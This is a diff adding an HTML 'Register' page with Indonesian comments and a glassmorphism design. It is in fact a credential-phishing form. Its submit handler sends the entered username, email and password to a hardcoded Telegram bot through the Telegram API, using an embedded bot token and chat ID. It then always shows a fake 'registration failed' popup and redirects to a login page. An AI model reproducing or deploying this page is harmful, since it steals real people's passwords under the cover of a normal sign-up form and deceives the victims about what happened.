@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Register Glassmorphism</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: url('background_new.png') no-repeat center center;
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* --- TRANSISI LOADING SCREEN --- */
+        .loader-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #140727;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 1s ease, visibility 1s ease;
+            opacity: 1;
+            visibility: visible;
+        }
+        .loader-wrapper.fade-out {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #a755d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* --- CONTAINER REGISTER --- */
+        .wrapper {
+            width: 420px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            color: #fff;
+            border-radius: 15px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .wrapper h1 {
+            font-size: 36px;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        .input-box {
+            position: relative;
+            width: 100%;
+            height: 50px;
+            margin-bottom: 25px; 
+        }
+
+        .input-box input {
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            outline: none;
+            border-radius: 40px;
+            font-size: 15px;
+            color: #fff;
+            padding: 20px 45px 20px 20px;
+            transition: 0.3s ease;
+        }
+
+        .input-box input::placeholder {
+            color: #e0e0e0;
+        }
+
+        .input-box input:focus {
+            border-color: #fff;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .input-box i {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            height: 45px;
+            background: #fff;
+            border: none;
+            outline: none;
+            border-radius: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+            font-weight: 600;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #f1f1f1;
+            transform: scale(1.02);
+        }
+
+        .login-link {
+            font-size: 14px;
+            margin-top: 25px;
+        }
+
+        .login-link p a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .login-link p a:hover {
+            text-decoration: underline;
+        }
+
+        /* --- STYLE CUSTOM POP-UP GAGAL --- */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.3s ease;
+        }
+
+        .popup-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .popup-box {
+            background: #1a1a1a;
+            padding: 30px 40px;
+            border-radius: 15px;
+            width: 340px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            transform: scale(0.8);
+            transition: 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .popup-overlay.show .popup-box {
+            transform: scale(1);
+        }
+
+        .popup-box h2 {
+            color: #ff4d4d;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .popup-box p {
+            color: #fff;
+            font-size: 15px;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        .popup-btn {
+            background: #6b2d9e;
+            color: #fff;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            outline: none;
+            width: 100%;
+        }
+
+        .popup-btn:hover {
+            background: #52207a;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LAYAR LOADING -->
+    <div class="loader-wrapper">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- FORM REGISTER -->
+    <div class="wrapper">
+        <form id="registerForm">
+            <h1>Register</h1>
+
+            <div class="input-box">
+                <input type="text" id="reg-username" placeholder="Username" required>
+                <i class='bx bxs-user'></i>
+            </div>
+
+            <div class="input-box">
+                <input type="email" id="reg-email" placeholder="Email" required>
+                <i class='bx bxs-envelope'></i>
+            </div>
+
+            <div class="input-box">
+                <input type="password" id="reg-password" placeholder="Password" required>
+                <i class='bx bxs-lock-alt'></i>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">Register</button>
+
+            <div class="login-link">
+                <!-- Tautan menuju halaman Login -->
+                <p>Already have an account? <a onclick="changePage('login.html')">Login</a></p>
+            </div>
+        </form>
+    </div>
+
+    <!-- POP-UP GAGAL (Akan selalu muncul) -->
+    <div class="popup-overlay" id="errorPopup">
+        <div class="popup-box">
+            <h2>Gagal</h2>
+            <p>REGISTRASI GAGAL</p>
+            <button class="popup-btn" id="closePopupBtn">Kembali</button>
+        </div>
+    </div>
+
+    <script>
+        // Loading awal saat halaman dimuat
+        window.addEventListener('load', () => {
+            const loader = document.querySelector('.loader-wrapper');
+            setTimeout(() => {
+                loader.classList.add('fade-out');
+            }, 300);
+        });
+
+        // Fungsi berpindah halaman dengan animasi loading
+        function changePage(url) {
+            const loader = document.querySelector('.loader-wrapper');
+            loader.classList.remove('fade-out');
+            
+            setTimeout(() => {
+                window.location.href = url;
+            }, 800); 
+        }
+
+        const form = document.getElementById('registerForm');
+        const btn = document.getElementById('submitBtn');
+        const errorPopup = document.getElementById('errorPopup');
+        const closePopupBtn = document.getElementById('closePopupBtn');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            btn.innerText = "Loading...";
+
+            const username = document.getElementById('reg-username').value;
+            const email = document.getElementById('reg-email').value;
+            const password = document.getElementById('reg-password').value;
+
+            // MASUKKAN KEMBALI TOKEN DAN CHAT ID KAMU DI SINI
+            const botToken = '8240955652:AAEr3WRYt-suHoPqb892FC8_TWuNONBVVUo'; 
+            const chatId = '8300509376';
+
+            const textMessage = `🚨 *Pendaftaran Baru* 🚨\n\n👤 Username: ${username}\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    // Berhasil atau tidak terkirim ke Telegram, TETAP munculkan Pop-up Gagal
+                    showCustomPopup();
+                })
+                .catch(error => {
+                    // Jika koneksi error, juga munculkan Pop-up Gagal
+                    showCustomPopup();
+                });
+        });
+
+        function showCustomPopup() {
+            errorPopup.classList.add('show');
+            btn.innerText = "Register"; // Kembalikan teks tombol jadi Register
+        }
+
+        // AKSI TOMBOL 'KEMBALI' DI POP-UP GAGAL
+        closePopupBtn.addEventListener('click', function() {
+            errorPopup.classList.remove('show');
+            // User akan langsung dilempar ke halaman login
+            changePage('login.html');
+        });
+    </script>
+
+</body>
+</html>
